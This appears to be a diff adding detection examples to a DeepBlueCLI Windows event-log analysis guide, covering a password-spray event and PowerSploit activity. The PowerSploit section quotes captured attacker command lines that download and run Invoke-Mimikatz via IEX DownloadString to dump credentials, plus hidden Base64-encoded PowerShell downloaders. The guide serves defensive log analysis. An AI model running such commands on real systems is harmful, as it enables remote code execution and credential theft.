@@ -1508,3 +1508,179 @@ Results : Use of C Sharp compiler csc.exe
 Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\g4g34pot.cmdline"
 Decoded :
 ```
+
+## Password Spraying
+
+|Event|Command|
+|-----|-------|
+|Password spraying|`.\DeepBlue.ps1 .\evtx\password-spray.evtx`|
+
+```
+Date    : 4/30/2019 12:27:40 PM
+Log     : Security
+EventID : 4648
+Message : Distributed Account Explicit Credential Use (Password Spray Attack)
+Results : The use of multiple user account access attempts with explicit credentials is an indicator of a password
+          spray attack.
+          Target Usernames: gsalinas cdavis lpesce Administrator melliott dpendolino cragoso baker cmoody rbowes
+          jkulikowski jleytevidal tbennett zmathis bgreenwood cspizor wstrzelec drook dmashburn sanson cfleener celgee
+          bhostetler eskoudis kperryman mtoussain thessman bgalbraith ssims psmith jorchilles smisenar bking mdouglas
+          jlake jwright econrad edygert lschifano sarmstrong ebooth
+          Accessing Username: jwrig
+          Accessing Host Name: DESKTOP-JR78RLP
+
+Command :
+Decoded :
+
+Date    : 4/30/2019 12:27:00 PM
+Log     : Security
+EventID : 1102
+Message : Audit Log Clear
+Results : The Audit log was cleared.
+          Account Name: jwrig
+Command :
+Decoded :
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\password-spray.ev
+tx"; id=4648} | ForEach-Object {($_.Message -split "`n" | Where-Object {$_ -match "^\s+Account Name:\s+(.+)"}).Trim() -r
+eplace "^\s+Account Name:\s+", ""} | Group-Object | Select Name, Count
+
+Name                         Count
+----                         -----
+Account Name:           jwrig           294
+Account Name:           smisenar         14
+Account Name:           ssims             7
+Account Name:           baker             7
+Account Name:           bgreenwood        7
+Account Name:           mdouglas          7
+Account Name:           bking             7
+Account Name:           bgalbraith        7
+Account Name:           cragoso           7
+Account Name:           cspizor           7
+Account Name:           dmashburn         7
+Account Name:           drook             7
+Account Name:           edygert           7
+Account Name:           jlake             7
+Account Name:           jorchilles        7
+Account Name:           kperryman         7
+Account Name:           melliott          7
+Account Name:           zmathis           7
+Account Name:           wstrzelec         7
+Account Name:           sarmstrong        7
+Account Name:           sanson            7
+Account Name:           lpesce            7
+Account Name:           jleytevidal       7
+Account Name:           econrad           7
+Account Name:           tbennett          7
+Account Name:           gsalinas          7
+Account Name:           jkulikowski       7
+Account Name:           psmith            7
+Account Name:           cmoody            7
+Account Name:           cfleener          7
+Account Name:           ebooth            7
+Account Name:           rbowes            7
+Account Name:           bhostetler        7
+Account Name:           lschifano         7
+Account Name:           mtoussain         7
+Account Name:           cdavis            7
+Account Name:           eskoudis          7
+Account Name:           thessman          7
+Account Name:           celgee            7
+Account Name:           dpendolino        7
+Account Name:           jwright           7
+Account Name:           Administrator     7
+```
+
+##PowerSploit (Security/System)
+|Event|Command|
+|-----|-------|
+|PowerSploit (security)|`.\DeepBlue.ps1 .\evtx\powersploit-security.evtx`|
+|PowerSploit (system)|`.\DeepBlue.ps1 .\evtx\powersploit-system.evtx`|
+
+```
+Date    : 9/20/2016 11:45:48 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Download via Net.WebClient DownloadString
+          Command referencing Mimikatz
+
+Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('http://eic.me/17'); Invoke-Mimikatz
+          -DumpCreds"
+Decoded :
+
+Date    : 9/20/2016 11:45:24 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Download via Net.WebClient DownloadString
+          Command referencing Mimikatz
+          PowerSploit Invoke-Mimikatz.ps1
+          Use of PowerSploit
+
+Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestat
+          ion/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+=================================================================================
+Date    : 9/20/2016 12:19:26 PM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Long Command Line: greater than 1000 bytes
+          500+ consecutive Base64 characters
+          Base64 encoded and hidden PowerShell command
+          Base64-encoded function
+          Download via Net.WebClient DownloadString
+          User-Agent set via command line
+
+Command : powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUA...EIALQBqAG8AaQBOACcAJwApAA==
+Decoded : $Wc=New-OBJECT ...
+
+Date    : 9/20/2016 12:15:54 PM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Long Command Line: greater than 1000 bytes
+          500+ consecutive Base64 characters
+          Base64 encoded and hidden PowerShell command
+          Base64-encoded function
+          Download via Net.WebClient DownloadString
+          User-Agent set via command line
+
+Command : powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFk...BPAEkATgAnACcAKQA=
+Decoded : [SYStEm.NET.SErvICePoiNTMANaGEr]::...
+
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\powersploit-security.evtx",".\evtx\powersploit-system.evtx"; id=4688} | 
+    Where-Object { $_.Message -ilike "*powershell*" } |
+    Select-Object -ExpandProperty Message
+
+Subject:
+        Security ID:            S-1-5-21-3463664321-2923530833-3546627382-1000
+        Account Name:           IEUser
+        Account Domain:         IE10WIN7
+        Logon ID:               0x6793C
+
+Process Information:
+        New Process ID:         0x11c
+        New Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Token Elevation Type:   TokenElevationTypeFull (2)
+        Creator Process ID:     0x98c
+        Process Command Line:   powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGM..aQBOACcAJwApAA==
+
+A new process has been created.
+
+Subject:
+        Security ID:            S-1-5-21-3463664321-2923530833-3546627382-1000
+        Account Name:           IEUser
+        Account Domain:         IE10WIN7
+        Logon ID:               0x6793C
+
+Process Information:
+        New Process ID:         0x700
+        New Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Token Elevation Type:   TokenElevationTypeFull (2)
+        Creator Process ID:     0xf14
+        Process Command Line:   powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('http://eic.me/17'); Invoke-Mimikatz -DumpCreds"
+```
